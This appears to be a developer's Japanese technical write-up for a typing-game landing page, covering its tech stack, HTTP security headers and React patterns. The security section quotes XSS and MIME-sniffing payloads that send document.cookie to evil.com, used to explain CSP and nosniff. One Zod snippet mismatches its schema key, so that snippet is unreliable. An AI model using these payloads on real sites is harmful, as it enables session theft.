# CRITICAL TYPING LP - 技術ドキュメント

## 1. 技術スタックの深掘り

各技術はメリットだけでなくデメリットも踏まえて採用を判断しました。「なぜ使ったか」と同時に「何が犠牲になるか」を理解することが適切な技術選定につながると考えています。

---

### Next.js (React)

|                |                                                                                                                                                                       |
| :------------- | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **採用理由**   | SEO対策（SSG/SSR）、OGP設定、`next/image` による画像最適化。LPとして検索流入を重視したため。                                                                          |
| **メリット**   | ファイルベースルーティング、メタデータAPIの充実、Vercelとの親和性の高さ。                                                                                             |
| **デメリット** | このLPの規模では明らかにオーバースペック。Viteのような軽量構成に比べてビルド設定が複雑で、フレームワークの抽象化によりNext.js固有の挙動を把握する学習コストがかかる。 |

---

### TypeScript

|                |                                                                                                                                                                                                      |
| :------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **採用理由**   | 静的型付けによるバグの早期発見と、コードの堅牢性・保守性の担保。                                                                                                                                     |
| **メリット**   | IDEの補完が強力になり、リファクタリング時の安全性が上がる。コードが自己文書化される。                                                                                                                |
| **デメリット** | コンパイルが通れば型の恩恵は消える（ランタイムエラーは防げない）。`any` の多用や型アサーションの乱用で形だけTypeScriptになる危険がある。複雑な型定義（型パズル）はかえって可読性を下げることもある。 |

---

### Tailwind CSS

|                |                                                                                                                        |
| :------------- | :--------------------------------------------------------------------------------------------------------------------- |
| **採用理由**   | ユーティリティファーストによる開発速度向上と、デザインの一貫性確保。                                                   |
| **メリット**   | HTMLに直接スタイルを書けるためコンテキストスイッチが少ない。クラス名を考える必要がなく、デザイントークンが統一される。 |
| **デメリット** | 凝ったアニメーションはCSSやFramer Motionに劣る。クラスが増えるとHTMLが長くなり可読性が下がることがある。               |

---

### Framer Motion

|                |                                                                                                                                            |
| :------------- | :----------------------------------------------------------------------------------------------------------------------------------------- |
| **採用理由**   | オープニングのカーテンアニメーションに使用。宣言的なAPIで複雑なアニメーションを管理できる。                                                |
| **メリット**   | `AnimatePresence` によるアンマウント時アニメーションなど、CSSだけでは難しい表現が簡潔に書ける。                                            |
| **デメリット** | バンドルサイズが大きいため、多用するとパフォーマンスへの影響が出る。今回はカーテン以外での使用を避け、他のアニメーションはCSS3で実装した。 |

---

### Zod

|                |                                                                                                                                                               |
| :------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **採用理由**   | 環境変数のスキーマバリデーションに使用。型安全な環境変数アクセスを実現し、フロントのコードをすっきりさせる。                                                  |
| **メリット**   | スキーマから型を自動生成できるため、型定義とバリデーションを二重管理しなくて済む。パース失敗時に明確なエラーメッセージが得られる。                            |
| **デメリット** | スキーマ定義が冗長になりがち。ランタイムバリデーションのコストがある（今回は起動時1回のみのため実質無視できる）。今回の用途ではデメリットがほぼ顕在化しない。 |

---

### ESLint / Prettier

|                        |                                                                                                                                                                                                                                                                      |
| :--------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **採用理由**           | コード品質の担保と、importの自動ソートを含むフォーマットの統一。                                                                                                                                                                                                     |
| **メリット**           | バグになりやすい箇所を事前に検知できる。チーム・個人問わずコードスタイルが統一される。                                                                                                                                                                               |
| **デメリット・注意点** | 設定を誤るとバグを見逃す可能性がある。例えば未使用変数を `_` プレフィックスで一律無視する設定にすると、本来検知すべき実装漏れを素通りさせてしまう。lintのwarningは「直せるなら直す・フレームワークの都合なら設定で除外・それ以外は立ち止まって考える」の判断が重要。 |

---

### Vercel

|                |                                                                                                                |
| :------------- | :------------------------------------------------------------------------------------------------------------- |
| **採用理由**   | Next.jsとの親和性の高さと、GitHub連携による自動デプロイ。独自ドメイン管理・SSL証明書の自動更新も一元化できる。 |
| **メリット**   | 設定ほぼゼロで高速デプロイが可能。CDNによるエッジ配信でパフォーマンスが高い。                                  |
| **デメリット** | 設定の多くがブラックボックスで、インフラの細かい制御はしにくい。AWS等と比べてカスタマイズ性に欠ける。          |

---

### Google Forms（お問い合わせ）

|                                  |                                                                                                                                                                                                                                                                                                                                                                                          |
| :------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **採用理由**                     | iframe埋め込みで迅速にお問い合わせ機能を追加でき、個人情報管理のリスクをGoogleに分離できる。                                                                                                                                                                                                                                                                                             |
| **メリット**                     | バックエンド不要。信頼性の高いインフラにデータを委ねられる。                                                                                                                                                                                                                                                                                                                             |
| **デメリット・セキュリティ対応** | iframeの `sandbox` 属性で権限を制限しています。特に `allow-top-navigation-by-user-activation` の設定がポイントで、「ユーザーの操作を起点とした場合のみ親ページへのナビゲーションを許可」します。これを `allow-top-navigation`（無条件許可）にすると、iframeの中からスクリプトで勝手に親ページを別URLに飛ばせてしまうため、Google Forms自体が信頼できるサービスであっても制限しています。 |

---

## 2. セキュリティ

middlewareでHTTPセキュリティヘッダーを一括設定しています。LPという性質上、ユーザー入力やAPI連携が少なく必要な設定は限られますが、個人的な学習も兼ねて主要なヘッダーを網羅的に設定しました。

---

### Content-Security-Policy（CSP）

XSS（クロスサイトスクリプティング）を防ぐためのヘッダーです。XSSとは、悪意あるスクリプトをページに注入して実行させる攻撃です。

**懸念される攻撃シナリオ**

```html
<!-- ① 外部スクリプトの読み込み -->
<script src="https://evil.com/steal.js"></script>

<!-- ② インラインスクリプトの注入（コメント欄等への埋め込み） -->
<img src="x" onerror="fetch('https://evil.com?cookie=' + document.cookie)" />
```

**CSPによる対応**

`script-src 'self'` の設定により、①の外部ドメインからのスクリプト読み込みはブロックできます。

②のインラインスクリプトについては、本来はより安全な **nonce方式**（許可済みスクリプトにランダムトークンを付与する方式）で防ぎたかったのですが、Next.js 16ではVercel上でもnonceをスクリプトタグに自動付与する仕組みが未対応のため断念し、`unsafe-inline` で妥協しています。

ただし、このLPにはユーザー入力を受け取ってページに表示する箇所が存在しないため、インラインスクリプトを注入される経路自体がありません。そのため `unsafe-inline` であっても実質的なリスクは低く、LPとして必要なXSS対策は確保できていると判断しています。

---

### Strict-Transport-Security（HSTS）

**懸念される攻撃シナリオ**

```
① ユーザーがhttp://criticaltyping.comにアクセス
② 攻撃者がHTTP通信を途中で傍受（SSLストリッピング）
③ ユーザーとHTTPで通信しつつ、攻撃者がサーバーとはHTTPSで通信
④ 暗号化されていないHTTP通信からCookieを盗む
⑤ 盗んだCookieでセッションハイジャック
```

HSTSを設定することでブラウザに「このドメインは常にHTTPSで接続する」と記憶させ、①のHTTPアクセス自体を発生させなくします。`max-age=63072000`（2年間）の設定で、長期間この挙動を維持します。

初回のHTTP通信時のみリスクとして残るが、認証やセッション管理がないため実害はなく、preload設定は見送っています。

---

### X-Content-Type-Options（nosniff）

**懸念される攻撃シナリオ**

```
① 攻撃者がJSコードを埋め込んだファイルを画像(.jpg)として用意
② サーバーが Content-Type: image/jpeg として返す
③ ブラウザが中身を独自解釈（MIMEスニッフィング）してJSと判断
④ スクリプトとして実行される
```

**③の具体的な悪用例**

攻撃者が用意するファイルは拡張子 `.jpg` だが、中身はJavaScript：

```js
// profile.jpg（中身はJS）
new Image().src = "https://evil.com/steal?c=" + document.cookie;
```

サイト側がこのファイルを `<script>` タグで読み込んでしまうと（意図的・または意図せず）：

```html
<!-- 一見「画像を読み込んでいるだけ」に見えるが… -->
<script src="/uploads/profile.jpg"></script>
```

`nosniff` なし → ブラウザが `Content-Type: image/jpeg` を無視して中身を解釈 → JSとして実行
`nosniff` あり → 「Content-Typeが `image/jpeg` なのにスクリプトタグで読もうとしている、拒否」 → 実行されない

`nosniff` を設定することでブラウザにContent-Typeを厳守させ、③の独自解釈を防ぎます。

---

### X-Frame-Options（DENY）

**懸念される攻撃シナリオ**

```
① 攻撃者が罠サイトを用意
② 罠サイトのiframeにcriticaltyping.comを透明なレイヤーで埋め込む
③ ユーザーには「無料プレゼントをクリック」と見えているボタンが
   実は透明iframeの「ゲームを始める」ボタンの上に重なっている
④ ユーザーが意図せず操作させられる（クリックジャッキング）
```

`DENY` にすることで全てのiframe埋め込みを拒否し、この経路を遮断します。

---

### Referrer-Policy（strict-origin-when-cross-origin）

**懸念される攻撃シナリオ**

```
① ユーザーが以下のURLにアクセス中
   https://criticaltyping.com/mypage?token=abc123
② ページ内のリンクから外部サイトへ遷移
③ 外部サイトのサーバーに Referer ヘッダーでフルURLが送られる
   Referer: https://criticaltyping.com/mypage?token=abc123
④ トークンが外部に漏洩
```

`strict-origin-when-cross-origin` にすることで、外部遷移時はオリジン（`https://criticaltyping.com`）のみ送信し、パスやクエリパラメータは送らないようにします。現状このLPには機密パラメータを持つURLはありませんが、将来的な機能追加に備えて設定済みです。

---

### Permissions-Policy

**懸念される攻撃シナリオ**

```
① XSS等で悪意あるスクリプトが注入される
② スクリプトがカメラ・マイク・位置情報へのアクセスを要求
③ ユーザーのデバイスが盗撮・盗聴・位置追跡される
```

Permissions-Policyでこれらの機能を無効化しておくことで、仮にスクリプト注入が発生してもデバイスへのアクセス自体を構造的にブロックします。CSPと合わせた多層防御の一環です。

---

### CSRF・CORSは今回見送り

- **CSRF:** ユーザーが操作する入力フォームがないため不要。お問い合わせはGoogle Formsに委ねており、自サーバーへのPOST処理がない。
- **CORS:** 外部APIと直接連携する機能がなく、同一オリジンのみのため不要。

将来ランキング検索等のユーザー入力機能やAPI連携を追加する際は、これらの設定が必須になります。

---

### 環境変数の漏洩：`NEXT_PUBLIC_` のつけすぎ

Next.jsの `NEXT_PUBLIC_` プレフィックスをつけた環境変数は、ビルド時にJSバンドルへ**文字列としてそのまま埋め込まれます**。

```js
// bundle.js（誰でも見れる）
const apiKey = "sk-1234567890abcdef...";
```

**攻撃経路：**

```
① DevToolsのSourcesパネルでbundle.jsを開き文字列検索するだけで取得できる
② GitHubに .env をコミットしてしまった場合、常時クローリングしているbotに即座に拾われる
③ git履歴に残るため、後から削除しても遡れば取得できる
```

漏洩したキーは**削除や非公開化では手遅れ**で、即失効・再発行が必須です。

**今回の判断：**

`NEXT_PUBLIC_GAME_URL | SITE_URL | GOOGLE_FORM_URL` はゲームへの遷移先URLであり、漏れても実害がない公開情報のため `NEXT_PUBLIC_` をつけています。APIキーやシークレットには絶対につけないことが鉄則です。

---

## 3. コード・設計の工夫

### 環境変数：Zodによる型安全なアクセス

#### `NEXT_PUBLIC_` プレフィックスの意味

Next.jsの環境変数は、プレフィックスの有無でブラウザへの公開可否が決まります。危険性については[セキュリティセクション](#環境変数の漏洩next_public_-のつけすぎ)を参照。

| 変数名                             | 参照できる場所                         |
| :--------------------------------- | :------------------------------------- |
| `NEXT_PUBLIC_GAME_URL=https://...` | サーバー・クライアント（ブラウザ）両方 |
| `SECRET_KEY=xxxxxxxx`              | サーバーのみ（ブラウザには渡らない）   |

`NEXT_PUBLIC_` を**つけ忘れると**クライアントコンポーネントで `undefined` になり、今回のようなURL遷移が動かなくなります。

#### Zodとの組み合わせ

`NEXT_PUBLIC_` の理解なしに環境変数をそのまま使うと、TypeScriptの型は `string | undefined` になります。使うたびに `undefined` チェックが必要になり、コードが煩雑になります。

```ts
// Zodなし：使うたびにnullチェックが必要
const url = process.env.NEXT_PUBLIC_GAME_URL; // string | undefined
if (!url) throw new Error("...");
```

Zodでスキーマを定義してアプリ起動時に一括バリデーションすることで、以降のコードは `string` として扱えます。

```ts
// env.ts（起動時に一度だけ実行）
const schema = z.object({
  NEXT_PUBLIC_GAME_URL: z.string().url(),
});

export const env = schema.parse({
  GAME_URL: process.env.NEXT_PUBLIC_GAME_URL,
});

// 使う側：undefinedチェック不要、型もstring確定
const url = env.GAME_URL;
```

#### `parse` vs `safeParse` の選択

Zodには2種類のパース方法があります。

| メソッド    | バリデーション失敗時の挙動        | 戻り値                                                   |
| :---------- | :-------------------------------- | :------------------------------------------------------- |
| `parse`     | 例外をthrow（アプリがクラッシュ） | パース済みの値                                           |
| `safeParse` | 例外を投げない                    | `{ success: true, data }` or `{ success: false, error }` |

環境変数のバリデーションには **`parse` を選択**しています。

理由は、「環境変数が不正な状態でアプリが動き続ける方が危険」だからです。起動時にクラッシュさせることで、設定ミスを即座に検知できます。`safeParse` はフォームバリデーション等「失敗してもアプリが動き続けるべき場面」で使います。

例えば、環境変数の設定ミスで開発環境のURLが本番に混入してしまう、誰かがリポジトリの設定を誤って変更する等

---

### stateの更新に関数型（prev）を使う理由

トグル処理は、setterに関数を渡す形で実装しています。

```tsx
const toggleMenu = () => setIsOpen((prev) => !prev);
```

Reactのstate更新は非同期で処理されます。そのため、現在のstateの値を直接参照して更新しようとすると、連打等で更新が複数キューに積まれた場合に古いstateを参照してしまうリスクがあります。

```tsx
// NG：isOpenが古い値を参照してしまう可能性がある
onClick={() => setIsOpen(!isOpen)}

// 連打時のイメージ（isOpenがfalseの状態から）
setIsOpen(!isOpen) // 1回目: !false = true
setIsOpen(!isOpen) // 2回目: まだisOpenがfalseのまま → !false = true（正しく反転されない）
```

`prev` を使うことでReactがキューに積まれた更新を順番に処理し、常に最新のstateをベースに計算することが保証されます。

```tsx
// OK：prevは常に最新のstateを受け取る
setIsOpen((prev) => !prev); // 1回目: false → true
setIsOpen((prev) => !prev); // 2回目: true → false（正しく積まれる）
```

「現在の値をもとに次の値を計算する」パターンは常に関数型を使う習慣をつけておくと安全です。

---

### ハンドラ関数をJSXから切り出す理由

```tsx
// インライン
onClick={() => setIsOpen(prev => !prev)}

// 切り出し
const toggleMenu = () => setIsOpen((prev) => !prev);
onClick={toggleMenu}
```

呼び出し箇所が1つでもJSXからロジックを分離することで、以下のメリットがあります。

- **再利用性：** 同じ処理を複数箇所（例：クリックとキーボード操作の両方）に適用できる
- **テストのしやすさ：** ロジックをJSXから独立させることで単体でテストできる
- **可読性：** JSXがすっきりし、何をしているかが関数名で伝わる

---

### ダメなコード例まとめ

| コード                               | 問題                                                               |
| :----------------------------------- | :----------------------------------------------------------------- |
| `onClick={setIsOpen()}`              | レンダリング中に即実行される→state更新→再レンダリング→の無限ループ |
| `onClick={() => setIsOpen(!isOpen)}` | 連打時に古いstateを参照し、更新が正しく積まれないリスクがある      |

---

### dynamic import と ssr:false

#### StarryBackgroundで発生した問題：ハイドレーションミスマッチ

`Math.random()` はサーバーとクライアントで**異なる値を生成する**。
Next.js の SSR ではサーバーで HTML を生成し、クライアントで同じ DOM を作って照合する（ハイドレーション）。
値が一致しないと React はエラーを出すか、意図しない UI になる。

本番でも動きはするが、**クライアントの state と DOM がズレた状態でスタートする**ため、
イベントハンドラが意図しない DOM に紐づいたり、アニメーションの挙動がおかしくなる。
どこで何が壊れるか予測できない地雷を抱えた状態になってしまう。

今回はランダムな値で星の位置・サイズ・アニメーション速度を生成していたため、ハイドレーションミスマッチが発生した。

```ts
// utils/star.ts — Math.random() を使っているため SSR と CSR で値が変わる
export const generateStars = (): Star[] => {
  const newStars: Star[] = [];
  for (let i = 0; i < COUNT; i++) {
    newStars.push({
      id: i,
      top:      `${Math.random() * STAR_TOP_LEFT}%`, // ← サーバーとクライアントで異なる値
      left:     `${Math.random() * STAR_TOP_LEFT}%`,
      size:     `${Math.random() * (...)}px`,
      delay:    `-${Math.random() * STAR_DELAY}s`,
      duration: `${STAR_DURATION_MIN + Math.random() * STAR_DURATION_MAX}s`,
    });
  }
  return newStars;
};
```

```
サーバーが生成した HTML         クライアントが生成した仮想 DOM
top: 23%, left: 45%    ≠      top: 67%, left: 12%
                ↑
           ミスマッチ！React が「違う」と検知する
```

#### 解決策：ssr:false で完全クライアントレンダリング

ファイルを2つに分けて解決している。

```
StarryBackground.tsx          ← ssr:false を設定する薄いラッパー
  └─ dynamic(ssr:false)
       └─ StarryBackgroundClient.tsx   ← 実際に星を生成・描画する
            └─ useState<Star[]>(generateStars)  ← クライアントのみで1回だけ生成
                 └─ 各 <div> として星を描画
```

`ssr: false` はコンポーネント単位で設定するため、`dynamic` でラップした別ファイルに切り出す必要がある。
`StarryBackgroundClient` に直接 `ssr: false` は設定できない。

```tsx
// StarryBackground.tsx — ssr:false を担当するラッパー
const StarryBackgroundClient = dynamic(
  () => import("./StarryBackgroundClient"),
  { ssr: false }, // サーバーでは一切レンダリングしない
);

export const StarryBackground = () => <StarryBackgroundClient />;
```

```tsx
// StarryBackgroundClient.tsx — 実際の描画を担当
const [stars] = useState<Star[]>(generateStars);  // クライアントのみで実行される

return (
  <div>
    {stars.map((s) => <div key={s.id} style={{ top: s.top, left: s.left, ... }} />)}
  </div>
);
```

`ssr: false` を付けると：

- サーバーは HTML を生成しない（その部分は空）
- クライアントのみで JS が実行される
- `Math.random()` の値が不一致になる心配がなくなる

#### `.then()` が必要なケース：named export

`dynamic` はデフォルトで **default export** を取り出す。
**named export** のコンポーネントを動的インポートするときは `.then()` が必要。

```tsx
// Hero.tsx — CurtainAnim は named export なので .then() で取り出す
const CurtainAnim = dynamic(() =>
  import("./CurtainAnim").then((m) => m.CurtainAnim),
);

// StarryBackgroundClient は default export なので .then() 不要
const StarryBackgroundClient = dynamic(
  () => import("./StarryBackgroundClient"),
  { ssr: false },
);
```

|        | default export                   | named export                                      |
| :----- | :------------------------------- | :------------------------------------------------ |
| 書き方 | `dynamic(() => import("./Foo"))` | `dynamic(() => import("./Foo").then(m => m.Foo))` |

#### dynamic import のもう1つの用途：パフォーマンス最適化

`ssr: false` なしの `dynamic` は**ハイドレーション対策ではなく、純粋にバンドルサイズ削減が目的**。

```tsx
// layout.tsx
const Footer = dynamic(() => import("@/components/features/Footer"));

// Hero.tsx
const News = dynamic(() => import("./News"));
```

初期ロード時に JS バンドルへ含めず、**必要になったタイミングで遅延ロード**する。
ファーストビュー以外のコンポーネントは基本的に `dynamic` で遅延ロードするのが目安。

- `Footer` — ページ最下部にあり、スクロールしないと表示されない
- `News` — Hero セクションの下部にあり、ファーストビューに入らない
- `CurtainAnim` — Framer Motion を使う重いコンポーネント。アニメーション再生後は不要になる

また同じファイルに定義したコンポーネントは `dynamic` で遅延ロードできない。
**バンドルに含まれた時点で遅延ロードの意味がなくなる**ため、遅延ロードしたいコンポーネントは必ず別ファイルに切り出す。
サブページを開いた際にも不要なコンポーネントのコードがバンドルに含まれてしまい、LCP 低下の原因にもなる。

ファーストビューに不要なコンポーネントを遅延ロードすることで、
**最初に読み込む JS の量を減らしてページの表示速度を上げる**のが目的。

|        | ssr:false あり                 | ssr:false なし            |
| :----- | :----------------------------- | :------------------------ |
| 目的   | ハイドレーションミスマッチ回避 | バンドルサイズ削減        |
| SSR    | しない                         | する                      |
| 使用例 | StarryBackground               | Footer, News, CurtainAnim |

#### ～ 余談 ～
因みにこの遅延読み込みをIntersectionObserverで書くと

```ts
useEffect(() => {
  const observer = new IntersectionObserver(
    (entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          // 処理
        }
      });
    },
    { threshold: 0.5 },
  );
  // ref.current は HTMLElement | null なので null チェックが必要
  if (ref.current) {
    observer.observe(ref.current);
  }
  return () => observer.disconnect();
}, []);
```

ライブラリとフレームワークはすごい ～完～

#### useState 遅延初期化で生成を1回に抑える

```tsx
// StarryBackgroundClient.tsx
const [stars] = useState<Star[]>(generateStars);
//                               ^ 関数参照を渡す（呼び出しではない）
```

`useState(generateStars())` と書くと**毎レンダーで関数が実行される**。
関数参照を渡す形 `useState(generateStars)` にすると**初回マウント時の1回だけ**実行される。
星の生成は80個分のループなので、この遅延初期化でパフォーマンスを守っている。

---

### useSmoothScroll — 型受け渡しとスクロール計算

スマホ用キーボード対応表でセクションへのスムーズスクロールを実現するカスタムフック。
スマホで閲覧するとキーボード対応表が長くなってしまう為にセクションごとに移動できるように設計。
基本をクリックすると実質先頭に戻れるため、先頭に戻れる処理は追加しませんでした。

#### 型

```ts
// hooks/useScroll.ts
export const useSmoothScroll = () => {
  const containerRef = useRef<HTMLDivElement>(null);
  //                          ^ RefObject<HTMLDivElement> 型になる

  const scrollToSection = (id: string) => { ... };

  return { containerRef, scrollToSection };
};
```

`useRef<HTMLDivElement>(null)` の型引数は「このrefが参照する DOM 要素の型」。
`null` を初期値にするのは、マウント前は DOM が存在しないため。

#### スクロール量の計算ロジック

```
画面(viewport)
┌─────────────────┐
│   ↑ containerTop (コンテナ上端の画面上のY座標)
│   ┌─────────────┐
│   │   container │
│   │   ↑         │ ← スクロール済み分 (scrollTop)
│   │ ─ ─ ─ ─ ─ ─ │ ← 現在の表示開始位置
│   │             │
│   │  ↑ elementTop (目的セクション上端の画面上のY座標)
│   │  [セクション]│
│   └─────────────┘
└─────────────────┘
```

```ts
const containerTop = containerRef.current.getBoundingClientRect().top;
const elementTop = element.getBoundingClientRect().top;

// elementTop - containerTop = コンテナの表示領域内でのセクションの相対位置
// + currentScroll           = コンテナ内でのセクションの絶対スクロール位置
// - HEADER_OFFSET_PX        = ヘッダーに隠れる分を補正
const targetTop =
  currentScroll + (elementTop - containerTop) - HEADER_OFFSET_PX;

containerRef.current.scrollTo({ top: targetTop, behavior: "smooth" });
```

#### 具体的な数値で追う

```
条件
  containerTop  = 280px  （viewport 上端からコンテナ上端までの距離）
  elementTop    = 700px  （viewport 上端から目的セクション上端までの距離、キー対応表だとおおよそ拗音の位置と仮定）
  currentScroll = 140px  （すでに 140px スクロール済み）
  HEADER_OFFSET = 140px   (ヘッダーに隠れる分)

  ※ getBoundingClientRect().top は「viewport の上端からその要素の上端までの距離」
  ※ elementTop - containerTop で viewport 基準 → コンテナ基準 に変換できる

計算
  elementTop - containerTop = 700 - 280 = 420px  （コンテナ基準のセクション位置）
  420 + currentScroll       = 420 + 140 = 560px  （絶対スクロール位置）
  560 - HEADER_OFFSET       = 560 - 140 = 420px  （ヘッダー補正後の最終スクロール位置）

結果
  containerRef.current.scrollTo({ top: 420 }) が実行される
```

`window.scrollTo()` ではなく `containerRef.current.scrollTo()` を使う理由は、
このページが `fixed inset-0 overflow-y-auto` の**独立スクロールコンテナ**だから。

```
fixed inset-0 を指定すると要素が画面に固定される
  → window のスクロール位置は常に 0 のまま
  → window.scrollTo() に命令を送っても微動だにしない

overflow-y-auto がかかっているのはコンテナ要素自体
  → ref でその DOM を直接掴み、scrollTo() で命令を送る
  → コンテナ内部のスクロール位置を操作できる
```

```ts
// ❌ window に命令しても動かない（実際にハマった）
window.scrollTo({ top: 420 })

// ✅ overflow-y-auto のコンテナに直接命令する
containerRef.current.scrollTo({ top: 420, behavior: "smooth" })
```

> 実装時に最初 `window.scrollTo()` で書いてしまい、スクロールが一切動かなかった。
> `fixed inset-0` のコンテナ構造を理解してからコンテナに直接命令する方針で解決。

---

### AnimationProvider / useAppAnimation — アニメーション状態管理

#### 設計の目的

開幕カーテンアニメーションは**サイト初回訪問時の1回だけ**再生したい。
ページ遷移（SPA）では再生せず、リロード時は再生する。

`useState` はリロードで初期化され、SPA 遷移では値を保持する性質をそのまま活用している。

#### AnimationProvider

```tsx
// app/providers.tsx
export function AnimationProvider({ children }: { children: ReactNode }) {
  const [hasPlayedOpening, setHasPlayedOpening] = useState(false);

  return (
    <AnimationContext.Provider
      value={{ hasPlayedOpening, setHasPlayedOpening }}
    >
      {children}
    </AnimationContext.Provider>
  );
}
```

`layout.tsx` で `AnimationProvider` をラップすることで、
**すべてのページコンポーネントからコンテキストにアクセスできる**。

#### 型設計の工夫

```ts
// types/index.ts
export type AnimationContextType = {
  hasPlayedOpening: boolean;
  setHasPlayedOpening: (value: boolean) => void; // ← シンプルな関数型
};
```

`setHasPlayedOpening` は `false → true` の一方通行でしか使わない。
そのため `Dispatch<SetStateAction<boolean>>` の汎用型より、
`(value: boolean) => void` のシンプルな型で**使い方の意図を絞っている**。

汎用型 `Dispatch<SetStateAction<boolean>>` にすればサブページからでも自由に開閉を操作できるが、
カーテンが何度も開くのは UX 的に鬱陶しいため、**初回訪問とリロード時のみ**に意図的に限定している。

**汎用型を使う場合の注意点：**

`Dispatch<SetStateAction<boolean>>` を使わず `(value: boolean) => void` のままにすると、
`prev => !prev` のような関数型を渡したときに TypeScript の型定義違いでエラーになる。

```ts
// (value: boolean) => void の場合
setHasPlayedOpening(true)           // ✅ boolean なので通る
setHasPlayedOpening(prev => !prev)  // ❌ 関数型は受け付けない → 型エラー

// Dispatch<SetStateAction<boolean>> の場合
// SetStateAction<boolean> = boolean | ((prev: boolean) => boolean)
setHasPlayedOpening(true)           // ✅ boolean なので通る
setHasPlayedOpening(prev => !prev)  // ✅ 関数型も受け付ける
```

例えばメニューの開閉のように `prev => !prev` で状態をトグルしたい場面では
`Dispatch<SetStateAction<boolean>>` が必要になる。
また `Dispatch<SetStateAction<boolean>>` を使うことで、
**state の更新権限を子コンポーネントに丸投げできる**ため、
将来カーテンを別の箇所から開閉させたい場合も安全に対応できる。

ただし**二度と切り替えたくない値は意図的に型を狭くする**のが正解な場合もある。
今回のカーテンは `false → true` の一方通行で十分なため、
`(value: boolean) => void` で意図的に使い方を制限している。

#### useAppAnimation（派生フック）

```ts
// hooks/useAppAnimation.ts
export const useAppAnimation = () => {
  const { hasPlayedOpening } = useAnimationContext();
  const shouldAnimate = !hasPlayedOpening;

  // duration/delay を shouldAnimate に応じて切り替える
  const commonTransition = (duration: number, delay: number = 0) => ({
    duration: shouldAnimate ? duration : 0,
    delay: shouldAnimate ? delay : 0,
  });

  // 初期スタイルを shouldAnimate に応じて切り替える
  const initialStyle = (fromStyle, toStyle) =>
    shouldAnimate ? fromStyle : toStyle;

  return { shouldAnimate, commonTransition, initialStyle };
};
```

アニメーション制御のロジックを各コンポーネントに書かず、このフックに集約することで**関心の分離**を実現。
コンポーネントは「アニメーションすべきか」を自分で判断せず、
`shouldAnimate` / `commonTransition` / `initialStyle` を受け取って使うだけでよい。

#### 呼び出しの流れと現状の使用箇所

```
AnimationProvider（layout.tsx でラップ）
  └─ AnimationContext に hasPlayedOpening を保持

useAnimationContext
  └─ Context から値を安全に取り出す
  └─ Provider 外で呼ぶと Error をthrowする安全装置つき
  └─ 現状の使用箇所: useAppAnimation, CurtainAnim

useAppAnimation
  └─ useAnimationContext を呼び出し shouldAnimate を計算
  └─ commonTransition / initialStyle を返す
  └─ 現状の使用箇所: Hero.tsx のみ
```

設計としては**どのページからでも呼べる汎用フック**だが、
現状カーテンアニメーションは Hero でしか使っていないため `useAppAnimation` の使用箇所は Hero のみ。
`AnimationProvider` が `layout.tsx` でラップされているため、
サブページ（`/faq`, `/contact` 等）のコンポーネントでも `useAppAnimation` を呼び出せる。

---

### CurtainAnim — パフォーマンス最適化

#### box-shadow → linear-gradient への変更

カーテンは `skewX` / `scaleX` などの **GPU アニメーション**で動く。

```
【問題】box-shadow を使っていた場合
  skewX や scaleX が動く
    → ブラウザが影の形も再計算（リフロー）
    → CPU に負荷が集中
    → アニメーションがカクつく

【解決】linear-gradient に変更
  ブラウザは要素を「一枚の画像」として扱う
  skewX などで変形しても GPU が画像を歪ませるだけ
  → CPU 負荷なし、GPU で滑らかに処理
```

```tsx
// CurtainAnim.tsx
style={{
  background: CURTAIN_GRADIENT,  // linear-gradient
  // box-shadow は使わない
}}
```

#### LazyMotion によるバンドルサイズ削減

```tsx
import { m, LazyMotion, domAnimation } from "framer-motion";

<LazyMotion features={domAnimation}>
  <m.div ...>  {/* motion.div の代わりに m.div を使う */}
```

`motion.div` は Framer Motion のすべての機能を含む重いコンポーネント。
`LazyMotion` + `domAnimation` + `m.div` の組み合わせにすると、
**DOM アニメーションに必要な機能だけを遅延ロード**できる。

#### カーテン境界線の光の演出

カーテンの左右パネルの境界をフワッとぼかす光を、パネルからはみ出した `<div>` で表現している。

```
左パネル                右パネル
[==========]  |  [==========]
        →光→  |  ←光←
       right:-60px  left:-60px
       (パネル外にはみ出して配置)
```

```tsx
style={{
  width: "60px",
  ...(isLeft
    ? {
        right: "-60px",  // 左パネルの右端からはみ出す
        background: "linear-gradient(to right, rgba(255,255,255,0.6), transparent)",
      }
    : {
        left: "-60px",   // 右パネルの左端からはみ出す
        background: "linear-gradient(to left, rgba(255,255,255,0.6), transparent)",
      }),
}}
```

`isLeft` によって `right` / `left` とグラデーションの向きを左右で反転させている。
スプレッド構文 `...( ? : )` を使うことで、条件によって異なるプロパティをオブジェクトに展開している。

`isLeft` の由来は呼び出し側から `side` props として渡ってくる。
`"right"` という文字列は `isLeft` の計算にだけ使われ、以降は `isLeft` の `true/false` だけで全制御している。

```tsx
// 呼び出し側
<CurtainPanel side="left" />   // → isLeft = true  → 左パネルの処理
<CurtainPanel side="right" />  // → isLeft = false → 右パネルの処理（三項演算子の : 側）
```

`isRight` を別途定義しなくても `isLeft = false` = 右パネルと読み替えられるため、変数は `isLeft` だけで十分。

```ts
// スプレッド構文で条件分岐するパターン
const obj = {
  共通プロパティ: "value",
  ...(条件 ? { a: 1 } : { b: 2 }),  // 条件によって異なるプロパティを展開
}
```

#### スマホ対応：画面幅で物理パラメータを切り替え

```tsx
const isMobile = typeof window !== "undefined" && window.innerWidth < 768;
const skewAngle = isMobile
  ? mobile.skewAngle
  : CONFIG.curtain.physics.skewAngle;
const shrinkScale = isMobile
  ? mobile.shrinkScale
  : CONFIG.curtain.physics.shrinkScale;
```

スマホはパネルが小さく、PC と同じ動きでは「過剰」に見える。
定数ファイル側でモバイル用の値を管理し、切り替えることで自然な演出を保っている。

---

### アンチパターン回避 — index を key に使わず id で管理（News.tsx）

#### 問題：配列の index を key にするアンチパターン

```tsx
// ❌ アンチパターン
items.map((item, index) => <li key={index}>...</li>);
```

React は `key` で「どの要素が変わったか」を識別する。
`index` を `key` にすると、静的なデータでは問題がないかもしれないが、
将来 **要素の追加・削除・並び替えが発生したとき key とデータがずれる**。

例：先頭に新しいニュースを追加したとき

- `key=0` が以前 id=1 だったものを指していたのに、新しい id=4 になる
- React は「key=0 の要素は変わっていない」と誤認識し、差分更新が狂う
